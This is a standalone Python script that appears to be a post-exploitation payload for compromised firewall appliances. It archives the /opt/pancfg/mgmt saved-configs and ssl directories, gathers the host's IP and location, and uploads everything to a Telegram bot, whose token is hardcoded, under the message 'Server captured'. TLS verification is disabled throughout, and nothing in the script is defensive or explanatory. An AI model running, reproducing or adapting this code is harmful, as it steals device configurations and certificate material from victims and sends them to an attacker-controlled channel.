import subprocess
import importlib
import sys
import hashlib
import os
import io
import tarfile
import tempfile
import requests
import urllib3

def install_package(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

def check_and_install_libraries():
    required_libraries = ["requests", "urllib3"]
    for lib in required_libraries:
        try:
            importlib.import_module(lib)
        except ImportError:
            print(f"Library {lib} not found, installing...")
            install_package(lib)

check_and_install_libraries()

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def send_to_telegram(message, files):
    tg_bot_token = "7330744500:AAHe_rHmqnh3Xcb7ZTieL22OoxWBHV7XFqc"
    tg_chat_id = "-1002403648422"
    url = f"https://api.telegram.org/bot{tg_bot_token}/sendMessage"

    # Prepare multipart data (text)
    multipart_data = {"chat_id": (None, tg_chat_id), "text": (None, message)}

    # Prepare files to send
    files_to_send = {}
    for file_name, file_data in files.items():
        print(f"Preparing file: {file_name}, Size: {len(file_data.getvalue())} bytes")
        
        # Create a temporary file to store the binary content
        with tempfile.NamedTemporaryFile(delete=False) as temp_file:
            temp_file.write(file_data.getvalue())
            temp_file_path = temp_file.name
            temp_file.close()  # Close the temporary file to use its path

            # Add the file to the files dictionary for sending
            files_to_send[file_name] = (file_name, open(temp_file_path, 'rb'), "application/x-gzip")

    try:
        # Send the files as multipart data
        response = requests.post(
            url.replace("sendMessage", "sendDocument"),
            data=multipart_data,  # Send text message
            files=files_to_send,  # Send the files
            verify=False
        )

        response.raise_for_status()  # This will raise an error for bad HTTP status codes

        if response.status_code == 200:
            print("Message and files sent successfully!")
            return True
        else:
            print(f"Error: {response.status_code}, Response: {response.text}")
            return False
    except requests.exceptions.RequestException as e:
        print(f"Exception during sending request: {e}")
        return False

def archive_directory(directory_path):
    tar_stream = io.BytesIO()
    with tarfile.open(fileobj=tar_stream, mode="w:gz") as tar:
        tar.add(directory_path, arcname=os.path.basename(directory_path))
    tar_stream.seek(0)
    return tar_stream

def main():
    try:
        ip_info = requests.get("http://ip-api.com/json", verify=False).json()
        ip = ip_info["query"]
        country = ip_info["country"]
        city = ip_info["city"]

        ip_hash = hashlib.sha256(ip.encode("utf-8")).hexdigest()

        message = f"🟢 Server captured\n"
        message += f"------------------\n"
        message += f"IP: {ip}\n"
        message += f"Country: {country}\n"
        message += f"City: {city}\n"
        message += f"------------------\n"
        message += f"#{ip_hash[:8]}"

        # Archive directories
        files = {
            "saved-configs.tar.gz": archive_directory("/opt/pancfg/mgmt/saved-configs"),
            "ssl.tar.gz": archive_directory("/opt/pancfg/mgmt/ssl"),
        }

        # Send message and files
        if send_to_telegram(message, files):
            print("Message and files sent successfully!")
        else:
            print("Error sending message and files.")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    main()
